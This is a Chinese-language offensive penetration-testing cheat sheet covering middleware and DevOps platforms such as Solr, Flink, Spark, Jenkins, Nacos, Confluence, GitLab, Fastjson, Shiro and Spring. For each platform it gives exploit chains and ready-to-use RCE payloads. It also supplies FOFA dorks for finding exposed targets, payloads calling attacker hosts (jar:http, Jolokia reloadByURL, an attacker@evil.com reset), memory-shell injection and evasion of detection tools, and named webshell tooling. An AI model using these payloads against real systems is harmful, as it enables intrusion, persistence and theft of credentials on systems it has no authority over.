### 9.5 CVE-2019-17558 — VelocityResponseWriter 模板 RCE
- **影响版本**: 5.0.0-8.3.1
- **利用链**: config 开启 params resource loader + `GET /solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=$x.class.forName(...))...exec(whoami)`

### 9.6 CVE-2021-27905 — ReplicationHandler SSRF
- **影响版本**: <8.8.2；`GET /solr/<core>/replication?command=fetchindex&masterUrl=http://127.0.0.1:8983/...`（配合内网利用）

### 9.7 Solr FOFA
- `app="Apache Solr"` / `port="8983"`；检测: 未认证访问 `/solr/` 看版本

---

## 10. Flink / Spark / Storm / 流处理

### 10.1 Flink CVE-2020-17518/17519 — 任意文件读写 → JAR 上传 RCE（★★★）
- **影响版本**: 17518: 1.5.1-1.11.2；17519: 1.11.0-1.11.2；8081 默认无认证
- **写文件**: `POST /jars/upload` filename=`../../../../../../../tmp/sucess`（穿越）
- **读文件**: `GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252fetc%252fpasswd`
- **RCE链**: `msfvenom -p java/shell_reverse_tcp ... -f jar > rce.jar` → Dashboard "Submit New Job" 上传提交 → 反弹shell（root）
- **FOFA**: `app="APACHE-Flink"` / `port="8081"`

### 10.2 Spark CVE-2022-33891 — Spark UI 命令注入 RCE
- **影响版本**: ≤3.0.3 / 3.1.1-3.1.2 / 3.2.0-3.2.1（CVSS 8.8）
- **条件**: 开启 `spark.acls.enable`（讽刺：开安全特性才触发）
- **利用链**: `GET /?doAs=\`echo <base64命令> | base64 -d | bash\``（HttpSecurityFilter 用户名拼接命令，盲注）
- **经典链**: Standalone Master 未认证直接提交恶意 App (JAR) → RCE
- **FOFA**: `app="APACHE-SPARK"` / `port="8080" && protocol="spark"`

### 10.3 Storm CVE-2021-38294 — Nimbus getTopologyHistory 命令注入 RCE
- **影响版本**: <2.1.1 / <2.2.1 / <1.2.4；Nimbus Thrift 6627 无认证
- **条件**: 集群已提交过至少一个 topology
- **利用链**: Thrift CALL getTopologyHistory，用户名参数 `;cmd` 注入 → bash 执行
- **检测**: nc 连 6627 发 `;sleep 5` 观察延时
- **FOFA**: `port="6627" && protocol="storm"`

---

## 11. Jenkins / Nacos / XXL-JOB / MinIO / DevOps平台

### 11.1 Jenkins

#### CVE-2024-23897 — args4j 任意文件读→RCE（高危高频）
- **影响版本**: Jenkins ≤ 2.441 / LTS ≤ 2.426.2
- **根因**: CLI 的 `expandAtFiles` 功能（`@文件名` 参数）解析文件内容作为参数值，错误消息回显文件前 3 行 → 任意文件读
- **利用链**:
  ```
  # 读 /etc/passwd
  java -jar jenkins-cli.jar -s http://TARGET -http connect-node @/etc/passwd
  # 结合 admin 凭据 / 弱口令 → 读 secrets → 用 Groovy Console 直接 RCE
  # 无认证可读：/etc/passwd、$JENKINS_HOME/users/*/config.xml（用户名/hash）
  ```
- **工具**: exploit：`python3 CVE-2024-23897.py -u http://TARGET`（免认证读文件）/ 配合登录后 `/script` 执行
- **FOFA**: `app="Jenkins"` / `body="Jenkins"`

#### CVE-2024-43044 — 任意文件读（winsw 插件，Windows）
- `winsw` 服务定义解析可读任意路径 → 拿服务凭据/密钥 → 提权 RCE

#### CVE-2026-53435 — XStream 反序列化 RCE（2026 最新）
- 管理面 `/descriptorByName` / CLI 参数反序列化，XStream 未加固 → gadget 链 RCE（需先低权/配合文件读）

#### 常青链（不依赖 CVE）
- **Groovy Script Console**: 登录 admin 后 `POST /script` 直接执行 `"id".execute().text`
- **弱口令**: admin/admin123、admin/admin → 进控制台 → `System.getRuntime().exec("cmd")`
- **API token / 凭据抓取**: `$JENKINS_HOME/credentials.xml` → 拿到各系统明文凭据 → 横向

### 11.2 Nacos

#### CNVD-2023-45001 — JRaft Hessian 反序列化 RCE
- **影响版本**: Nacos 1.4.0-1.4.2 / 2.0.0-2.2.0（3.2.0 复现于老版）
- **利用链**: `POST /v1/ns/raft/state` 投递 Hessian 反序列化 → 无认证 RCE（绕过 9900 端口或依赖旧版）
- **工具**: nacos-cve-2023-45001 exploit（利用 jraft/hessian + BCEL）
- **检测**: 访问 `/nacos/v1/ns/operator/metrics` 判定实例；版本查 `/nacos/v1/console/health/liveness`

#### CVE-2023-27773 — Derby SQL 注入→RCE
- **条件**: `nacos-derby` 数据目录可写（默认 SQLite/Derby 单机部署）+ 9848 端口可达
- **利用链**: 未授权执行 SQL（Derby 支持 `CREATE ALIAS` + 静态方法）→ 写文件/getshell：
  ```
  POST /nacos/v1/cs/configs?search=accurate&dataId=&group=&tenant=&pageSize=9&pageNo=1
  → 注入点 `group` 参数，构造 ALIAS 实现 RCE
  ```
- **工具**: `nacos-derby-rce` PoC 脚本（利用带内建 Derby 密码）

#### CVE-2021-29441 — 默认 UA 认证绕过
- `User-Agent: Nacos-Server` → 绕过鉴权访问所有 `/v1/auth` 管理接口 → 读全部配置（密文密钥）

#### 默认 JWT 密钥（高危）
- 老版本默认 `secret.key` 硬编码 `SecretKey012345678901234567890123456789012345678901234567890123456789` → 伪造 admin Token 直接调 `/v1/auth/users/login` 提权
- **检测**: 拿任意用户 token，用默认 key 验签；`HS256` + 默认 secret 签名后请求被接受即中

### 11.3 XXL-JOB

#### 未授权 GLUE 接口 → RCE（高频）
- **条件**: admin 管理端（`/xxl-job-admin`）未设 accessToken 或弱口令
- **利用链**:
  ```
  1. 登录 /xxl-job-admin（默认 admin/123456）
  2. 新建执行器任务 → GLUE(Groovy/Python/Shell) 在线编辑
  3. 保存触发 → 执行器执行任意命令
  # 或未授权: POST /xxl-job-admin/jobinfo 直接注册执行器 + 触发 GLUE
  ```
- **检测**: 访问 `/xxl-job-admin/` 是否出现登录页（未设 token 时直接可注册执行器）

### 11.4 MinIO

#### CVE-2023-28432 — 配置信息泄露（拿根密钥）
- `GET /minio/bootstrap/v1/verify` 无认证 → 泄露 `MINIO_ROOT_USER` / `MINIO_ROOT_PASSWORD`（多环境已修复，旧版高发）

#### CVE-2023-28434 — 恶意 jar 上传→服务端模块加载 RCE（Evil_MinIO 链）
- **利用链**: 拿到 mc admin 权限后 → 上传包含恶意 class 的 jar 到 bucket → 用 `mc admin update`/模块加载触发 → RCE
- **工具**: `Evil_MinIO`（github 公开利用脚本，构造恶意 MinIO 服务端 tar）

### 11.5 Spring Cloud Gateway / Cloud Function / 数据中台

#### CVE-2022-22947 — Gateway SpEL RCE
- **利用**: `POST /actuator/gateway/routes/{id}` + `filters: [{"name":"AddResponseHeader","args":{"value":"#{T(java.lang.Runtime).getRuntime().exec('cmd')}"}}]` → refresh → RCE
- **工具**: `CVE-2022-22947_RCE_Exploit.py`

#### CVE-2022-22963 — Spring Cloud Function SpEL RCE
- **利用**: `POST /functionRouter` + 头 `spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("cmd")` → RCE

#### Apache ShenYu — CVE-2022-23944 未授权 RCE
- 管理面 `/plugin` 未授权 → 修改 SpringCloud/Dubbo 插件 → SpEL/指令注入 RCE

#### Apache NiFi — CVE-2023-34468 恶意组件 RCE
- 认证后上传恶意 Processor NAR → 执行任意代码（配合弱口令）

#### Sonatype Nexus — CVE-2024-5082 认证绕过→文件读
- `/service/rest/v1/...` 绕过 → 提取配置/凭据 → 配合 RCE（老版本 + 未设密码策略）

#### Grafana — CVE-2023-3128 未授权数据库查询 / CVE-2021-43798 目录遍历
- 3128: 前台 `api/ds/query` 未授权 → 拖库；43798: `public/plugins/<任意>/../../` 读任意文件（拿 SMTP/JDBC 配置）

---

## 12. Confluence / GitLab / 协作平台

### 12.1 Confluence（Atlassian）

#### CVE-2023-22527 — OGNL 模板注入 RCE（CVSS 9.8，免认证）
- **影响版本**: Confluence Data Center/Server 8.0-8.5.3 等（2024-01 在野利用）
- **利用链**:
  ```
  POST /template/aui/text-inline.vm HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  label='%2b#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(#parameters.x,0)%2b'
  &x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd',(new freemarker.template.utility.Execute()).exec({"id"}))
  ```
  响应头 `X-Cmd` 回显命令结果（freemarker Execute / `Runtime.exec` 变体）
- **检测**: `POST /template/aui/text-inline.vm` + 恶意 OGNL 观察响应头/时长

#### CVE-2023-22515 — 权限提升→管理员→RCE（CVSS 9.8）
- **影响版本**: 8.0.0-8.5.1（2023-10 在野利用）；`/server-info.action` 或 `/json/setup-restore` 泄露 `bootstrapStatusProvider.applicationConfig.setupComplete=false` → 提权
- **利用链**: 拿 admin 后 → 系统管理 → 上传插件 jar / 自定义模板 → RCE

#### CVE-2022-26134 — OGNL 注入 RCE（CVSS 9.8，CVE-2021-26084 同族）
- **利用**:
  ```
  GET /pages/doenterpagevariables.action?...&queryString=...%24%7B%28%23a%3D...exec...%29%7D HTTP/1.1
  # 或直接:
  /%24%7BClass.forName(%22java.lang.Runtime%22)%2egetRuntime()%2eexec(...)%7D/
  ```
- **检测**: 访问 `/%24{7*7}/` 观察是否回显 49

#### CVE-2021-26084 — OGNL RCE（同族旧版）
- `POST /pages/createpage-entervariables.action` + `queryString` OGNL → RCE
- **FOFA**: `app="Atlassian-Confluence"` / `body="Atlassian Confluence"`

### 12.2 GitLab

#### CVE-2023-7028 — 任意邮箱密码重置（CVSS 10.0，2024-01 在野）
- **影响版本**: 16.1.0-16.1.5 / 16.3.0-16.3.6 / 16.4.0-16.4.4 / 16.5.0-16.5.6 / 16.6.0-16.6.4 / 16.7.0-16.7.1
- **根因**: 密码重置请求的 `email` 字段改为数组（`user[email][]`）→ 同时向攻击者邮箱+真实邮箱发送重置链接 → 受害者重置时攻击者邮箱同步收到 → 接管任意账号
- **利用链**:
  ```
  POST /users/password HTTP/1.1
  user[email][]=victim@target.com
  user[email][]=attacker@evil.com
  ```
- **检测**: 构造双邮箱重置，观察是否两个邮箱都收到重置邮件

#### CVE-2024-45409 — SAML 认证绕过（GitLab 和 HashiCorp 产品族通用）
- Ruby SAML / OmniAuth 默认签名校验缺陷 → 伪造 SAML 断言 → 以任意用户登录（管理员可接管实例）
- **利用链**: 拿到任意有效 IdP 签发的 token（或伪造时 `XmlDoc` 签名绕过）→ 以 admin 身份登录 → 全权 RCE

#### CVE-2021-22205 — ExifTool 未认证 RCE（老版经典）
- **影响版本**: ≤ 13.8.8 部分版本（2021-10 在野）
- **利用**: 上传恶意 JPEG（含 exiftool `-eval` 载荷）→ 未认证触发 → RCE
- **工具**: `CVE-2021-22205.py`（批量利用脚本）

#### CVE-2022-2884 — 部署令牌硬编码（历史）
- 登录响应/注册流程泄露部署 token → 读写仓库

### 12.3 其他协作平台
- **Jira**: CVE-2024-21683 Servlet 参数注入 RCE（需登录）；老版 CVE-2019-11581 模板注入 RCE（`index.jsp?showRapidBoard=true` + velocity `$x`）
- **Confluence 同族（Bitbucket）**: CVE-2022-43781 / CVE-2024-22416 命令注入 RCE

---

## 13. Java框架生态 RCE

### 13.1 Fastjson（2026 双 0-day 是本轮最大威胁）

#### [1.x] CVE-2026-16723 (QVD-2026-43021) — `@JSONType` 资源探测 RCE（无补丁）
- **影响版本**: fastjson 1.2.68–1.2.83（1.x 最终版无修复；1.2.83_noneautotype 仅缓解）
- **利用条件**: 无需 autoType/expectClass/三方 gadget；**必须 Spring Boot fat-JAR**（LaunchedURLClassLoader 才能解析 `jar:http` URL）；SafeMode 未开
- **根因**: `checkAutoType()` 对未知 `@type` 先做资源探测（类名拼 URL 从远程 JAR 读 `@JSONType` 注解即视为"信任信号"）→ `defineClass` 加载触发 `clinit` → RCE
- **POC**:
  ```
  # JDK 8 单段直打: {"@type":"jar:http:..attacker:18081.x!.foo.Exception","x":1}
  # JDK 9+ 两段 /proc/self/fd 链: 先下载缓存 → {"@type":"jar:file:.proc.self.fd.7!.fd7.Exception"}
  # 关键: IP 写成整数(127.0.0.1→2130706433，点会被替换成/)，..→//，.evil!→/evil!/
  ```
- **指纹检测**: `@type` 含 `jar:http`/`jar:file`/`/proc/self/fd`；畸形 JSON `{"set[{"@type":"java.net.URL","val":"http://dnslog"}]"A":"B"}` 触发 DNSLog

#### [Fastjson2] QVD-2026-45876 — FNV-1a 哈希碰撞 autoType 绕过 RCE（≤2.0.62，修复 2.0.63）
- **条件**: **无需开 SupportAutoType**；JSON 反序列化为 Object/JSONObject/泛型即可
- **根因**: `checkAutoType()` 用增量 FNV-1a 哈希匹配 acceptHashCodes 白名单，命中后不做明文等价校验 → 构造前缀哈希碰撞 + 尾部 `jar:http://attacker/evil.jar!/` → 远程 jar 加载 RCE
- **缓解**: `-Dfastjson2.parser.safeMode=true`；WAF 拦含 `@type` 的 JSON

#### 历史高发（常青）
- **CVE-2025-70974 (CVSS 10.0)**: <1.2.48 autoType 缺陷，2023-2025 在野持续利用
- **CVE-2022-25845**: <1.2.83 可绕过默认 autoType 关闭
- **CVE-2017-18349 (经典 1.2.24)**: `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/Exploit"}` → JNDI
- **工具**: fastjson_tool / JNDIExploit；`@type` 探测→选链→内存马

### 13.2 Shiro

#### CVE-2023-34478 — 认证绕过（CVSS 9.8）
- **影响**: ≤1.11.0；修复 1.12.0+。`/**` 模式对无尾斜杠根路径（`/contextPath`）不匹配 → 过滤器链未拦截 → 未认证访问受保护资源

#### CVE-2023-46749/46750 — 路径穿越绕认证 + 开放重定向（<1.13.0）
- 配合路径重写时 `;` 分号穿越（默认 blockSemicolon 开启即缓解）

#### CVE-2016-4437 Shiro-550 — RememberMe 默认密钥（仍最高频）
- **流程**: `rememberMe=yes` → 响应 `Set-Cookie: rememberMe=deleteMe` 判定存在 → 字典爆破 AES 密钥（默认 `kPH+bIxk5D2deZiIxcaaaA==` CBC）→ 序列化 SimplePrincipalCollection 加密发送，响应不再含 deleteMe = 密钥正确 → CC 链/CB1.9.2 反序列化 → 内存马
- **工具**: ShiroAttack2（detect/crack/exec/memshell，CBC/GCM 自动切换）；shiro_keys.txt 字典

### 13.3 Spring 生态

#### CVE-2024-50379 / CVE-2024-56337 — Tomcat JSP 编译 TOCTOU RCE
- **注意**: 本体是 **Tomcat**（非 spring-webmvc）：JSP 编译竞态 + **大小写不敏感文件系统** + **默认 Servlet 可写**（非默认配置）→ 文件覆盖 RCE。Boot 通过 tomcat-embed-core 受影响
- **检测**: 先验版本 + 确认 default servlet 可写，多数环境不可利用

#### CVE-2025-41234 — RFD（请求派生 Content-Disposition）→ RCE（6.1.21/6.2.8 修复）

#### Spring Boot Admin FeiShuNotifier — SpEL 注入 RCE（AIKIDO-2026-10097，≤3.5.6）
- 需改外部配置：`spring.boot.admin.notify.feishu.message=#{T(java.lang.Runtime).getRuntime().exec('calc')}` → 通知触发执行

#### Actuator 全链（实战最高频）
```
1. /actuator 枚举端点（未授权）
2. /jolokia + Logback reloadByURL: 
   /jolokia/exec/ch.qos.logback.classic:Name=default,Type=...JMXConfigurator/reloadByURL/http:!/!/attacker!/logback.xml
   → 恶意 logback.xml: XXE 读文件 或 <insertFromJNDI> 指向恶意 RMI/LDAP（高JDK配BeanFactory+EL绕过）
3. /env + /refresh: eureka.serviceUrl.defaultZone=http://attacker/payload → Eureka<1.8.7 XStream 反序列化 RCE / 改 datasource
4. /heapdump: 下载~150MB 堆 → MAT 提取 accessKeySecret → 云接管（信息泄露但常为云上跳板）
5. H2 Console: CVE-2021-42392 未认证 JNDI（driver=javax.naming.InitialContext + jdbcUrl=ldap://x/Exploit）
   / CREATE ALIAS Runtime.exec() / Hikari connection-test-query 注入
工具: SpringBootExploit / SpringBootVul-GUI / java-chains
```

### 13.4 Struts2 / Log4j2

#### S2-066 CVE-2023-50164 — 文件上传路径穿越 RCE（CVSS 9.8）
- 大小写参数绕过 FileUploadInterceptor → `../../evil.bin` 任意上传 → RCE（2.0-6.3.0，修 2.5.33/6.3.0.2）

#### S2-067 CVE-2024-53677 — 上传逻辑缺陷 RCE（CVSS 9.8，2024-12 在野）
- 同 S2-066 补丁不完整，可操纵上传参数路径穿越 → RCE（2.0-6.3.0.2，修 6.4.0 需迁移新上传机制）
- **工具**: EQSTLab/CVE-2024-53677；在野扫描激烈

#### S2-069 CVE-2025-68493 — XWork XXE（2026-01 在野）
- 2.0-6.1.0 → XXE 读文件/SSRF；修 Struts 6.1.1；缓解 `-Djavax.xml.accessExternalDTD=""`

#### Log4j2 CVE-2021-44832 — JDBC Appender JNDI RCE
- **注意**: Log4Shell 缓解（删 JndiLookup、formatMsgNoLookups）**均无效**——触发点在 JdbcAppender 自己的 JNDI 处理。需能改 log4j2 配置
- 2.17.1 起需额外 `log4j2.enableJndiJdbc=true`

### 13.5 Jackson / SnakeYAML / XStream

#### Jackson GHSA-j3rv-43j4-c7qm — PTV 泛型参数绕过 RCE（2025 新洞）
- **影响**: jackson-databind 2.10-2.18.7/2.19-2.21.3；tools.jackson 3.0-3.1.3；修 2.18.8/2.21.4/3.1.4
- **根因**: 类型 ID 含 `<` 时只校验裸容器类名过 PTV，嵌套泛型参数完全不过 → 白名单容器内走私被拒类
- **POC**: 仅放行 ArrayList 时 `{"value":["java.util.ArrayList<com.evil.EvilGadget>",[{"cmd":"calc.exe"}]]}`（变体 HashMap<Evil,String>、ArrayList<Evil[]>）

#### SnakeYAML CVE-2022-1471 — Constructor 未限制 RCE
- `new Yaml(new Constructor())` 解析不可信 YAML → 任意类实例化（`!!javax.script.ScriptEngineManager` + URLClassLoader 链）；修 2.0，用 SafeConstructor

#### XStream
- 2024-2026 无新 CVE；历史链 CVE-2021-29505 / CVE-2019-10173 可复用；1.4.18+ 默认禁危险类型需显式 setupDefaultSecurity

---

## 14. 内存马 / 回显链 / JNDI 高版本绕过

### 14.1 内存马载体分类（2025-2026）

| 类型 | 注入机制 | 触发 | 隐匿性 |
|------|---------|------|--------|
| Filter 型(经典) | 反射取 StandardContext，FilterDef+FilterMap(`/*`)+addFilterMapBefore，或手动塞 ApplicationFilterConfig 到 filterConfigs 缓存 | 任意 HTTP 请求 doFilter | 高 |
| Servlet 型 | createWrapper→addChild→addServletMappingDecoded | 访问映射 URL | 中 |
| Listener 型 | applicationEventListeners 加 ServletRequestListener，requestInitialized 执行 | 每次请求 | 极高(无 URL 映射不可扫) |
| Valve 型 | Tomcat Pipeline 插 Valve | 请求 | 高 |
| WebSocket Endpoint | 反射塞 WsServerContainer 的 endpointConfigs | WS 连接 | 极高 |
| Netty Handler | 非 Servlet 容器(WebFlux) | 请求 | 高 |
| Spring Controller/Interceptor | RequestMappingHandlerMapping 动态注册恶意 Controller | 业务接口 | 极高 |
| Agent 型 | Instrumentation.addTransformer+retransformClasses 改字节码 | 篡改的类方法被调用 | 最高(无独立组件，须重启移除) |
| VM Anonymous Class | JVM 隐藏类机制(GSL5 称最隐蔽) | 反序列化/代码执行点 | 极高 |

**反序列化上下文注入关键链**（无 request 可用时）:
```
Thread.currentThread().getContextClassLoader()
 → ParallelWebappClassLoader.resources → StandardRoot.context → StandardContext
注册两条路: ctx.filterStart()(标准) / 反射手动塞 filterConfigs(底层，副作用小)
CC2 链 + TemplatesImpl(被加载类须是 AbstractTranslet 子类) = 完全无文件落地
```

**Agent 型细节**: agentmain 动态 attach 后已加载类**必须 `inst.retransformClasses`**；冰蝎/哥斯拉加密马控制 retransform 时机 + 注入点(HttpServletResponse.getWriter)实现双向加密

### 14.2 工具链（本机可用 GSL5 优先）
- **GSL5 GodzillaSuper**（本机 `D:\Desktop\Claude\tools\GodzillaSuper\bin\gsl5.jar`）: 支持 Tomcat Filter/Servlet/Listener、Spring Controller、Jetty、**VM Anonymous Class**；RASP 绕过(检测 OpenRASP/JRASP/Elkeid，禁 hook，卸载 agent)；**ASM 字节码多态混淆**(随机字段名+NOP 规避哈希特征)；MCP 无头模式
- **jMG java-memshell-generator**: Tomcat/Resin/Jetty/WebLogic/WebSphere/Undertow/GlassFish/Spring；输出 BASE64/BCEL/CLASS/JS/JSP/JAR
- **MemShellParty v1.0.0(2025-07)**: 18 种中间件、JDK 6-21，payload 比 jMG 小 30-80%
- **JYso**: ysoserial+JNDIExploit 双功能，18 个内存马类，无文件落地 Agent 入口，75 个 gadget
- **ShiroExploit**: 基于 MemShellParty + jMG injector，支持 Tomcat 10+/高版本 JDK

**检测对抗**: memory-shell-detector(private-xss) — 检测原理=无 class 文件+类名关键字+字节码特征(Runtime.exec/ProcessBuilder/ScriptEngine/defineClass/JNDI lookup)+非标准类路径；**Agent 型不可移除**

### 14.3 回显链（Echo Channel）

**技术一 ThreadLocal+ApplicationFilterChain(经典 Kingkk)**: 反射置 ApplicationDispatcher.WRAP_SAME_OBJECT 去 final → 二次请求 internalDoFilter 末尾 lastServicedRequest.set → ThreadLocal 取回显。**局限**: JDK17+ 改不了 final → Boot3/Spring6 失效；触发点在 internalDoFilter 之前(如 Shiro)不可用

**技术二 Tomcat 全局存储回显**（规避 ThreadLocal 限制）:
```
WebappClassLoaderBase(线程上下文CL) → resources(StandardRoot) → context(StandardContext)
 → context(ApplicationContext) → service(StandardService) → connectors(Connector[])
 → protocolHandler(Http11NioProtocol→AbstractProtocol) → handler(ConnectionHandler)
 → global(RequestGroupInfo) → processors → requestInfo → req(coyote.Request) → getNote(1) → HttpServletRequest
```

**技术三 半自动化反射搜索全局变量(长亭 2024 通用化)**: 遍历 Thread.getThreads() 及全局对象属性，按类型名关键字(Request/ServletRequest/RequestGroup)匹配 request 存储位；**BFS 优于 DFS**；visited 防环；限制递归深度(防 payload 过大，Shiro 头部传输致命)

其他: 报错回显 / DNSLog 回显(不出网) / 反连回显(ReverseEcho)；ShiroAttack2 支持 TomcatEcho/SpringEcho/DFS-AllEcho/ReverseEcho/NoEcho 五种

### 14.4 JNDI 高版本绕过（JDK 8u191+ / 11 / 17 / 21）

**阈值**: LDAP `trustURLCodebase=false`(8u191/11.0.1 起)；RMI 更早(8u113)；JDK21 `trustSerialData=false` 使 javaSerializedData 反序列化失效

**通用原理**: JNDI 解析 Reference 先本地 classpath 找 ObjectFactory，失败才远程 → 用 **ResourceRef**(Reference 子类, factoryLocation=null) 强制走本地工厂

| 链 | 本地工厂/触发类 | 说明 |
|----|----------------|------|
| **BeanFactory+ELProcessor**(最通用) | org.apache.naming.factory.BeanFactory(Tomcat 依赖，攻击面大) → forceString=x=eval → ELProcessor.eval() | LDAP 条目: javaClassName=javax.el.ELProcessor; forceString=x=eval; x=Runtime.getRuntime().exec('...'); javaFactory=BeanFactory |
| **BeanFactory+GroovyShell** | groovy.lang.GroovyShell#evaluate | 无 EL 时用 |
| **LDAP 本地反序列化** | Obj.decodeObject 先 deserializeObject(JDK17 isSerialDataAllowed=true) | javaSerializedData + 本地 gadget(CC6)；**JDK21 失效** |
| **DruidDataSourceFactory** | createDataSourceInternal 解析 JDBC URL → H2 等驱动 RCE | JDK11+ 可用，依赖 Druid |
| **C3P0/mchange-commons-java** | JavaBeanObjectFactory → userOverridesAsString hex 反序列化 | **CVE-2026-27727/GHSA-m2cm-222f-qw44(2025 新)**: 即使 trustURLCodebase=false 仍可远程下载执行；修 mchange-commons-java≥0.4.0 |

**工具**: JNDIMap(X1r0z, 2025 活跃, RMI/LDAP/LDAPS, JDBC 连接池 RCE: DBCP/Druid/Hikari 驱动 MySQL/PG/H2/Derby) / JYso / java-chains / JNDI-Injection-Exploit-Plus / JNDIBypass

---

## 15. 通用 GetShell 链与工具

```
中间件RCE → 反弹shell/写webshell → 内存马(Filter/Agent型) → 提权 → 内网横向
工具: GSL5 GodzillaSuper / JYso / ysoserial / JNDIExploit / redis-rogue-server
```

---

## 参考来源（第6-10章）

- Redis RediShell: [Sysdig](https://www.sysdig.com/blog/cve-2025-49844-redishell) / [JFrog](https://jfrog.com/blog/exploiting-remote-code-execution-in-redis/)
- Redis CVE-2022-0543: [vulhub](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md)
- Redis 主从: [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
- ActiveMQ 46604: [evkl1d POC](https://github.com/evkl1d/CVE-2023-46604)
- ActiveMQ 3088: [vulhub](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md)
- RocketMQ 33246: [Malayke POC](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)
- Kafka 25194: [AttackerKB](https://attackerkb.com/topics/2HVrjOw9dn/cve-2023-25194)
- Kibana 25012/25014/25015: [CERT-FR](https://www.cert.ssi.gouv.fr/avis/CERTFR-2025-AVI-0377/json/)
- Solr 45216: [oss-sec](https://seclists.org/oss-sec/2024/q4/31)
- Flink 17518/17519: [FreeBuf](https://www.freebuf.com/articles/vuls/261010.html)
- Spark 33891: [K3ysTr0K3R POC](https://github.com/K3ysTr0K3R/CVE-2022-33891-EXPLOIT)
- Storm 38294: [Rapid7](https://www.rapid7.com/db/modules/exploit/linux/misc/nimbus_gettopologyhistory_cmd_exec/)
- Memcached/ZK: [HackTricks 11211](https://hacktricks.wiki/en/network-services-pentesting/11211-memcache/index.html)
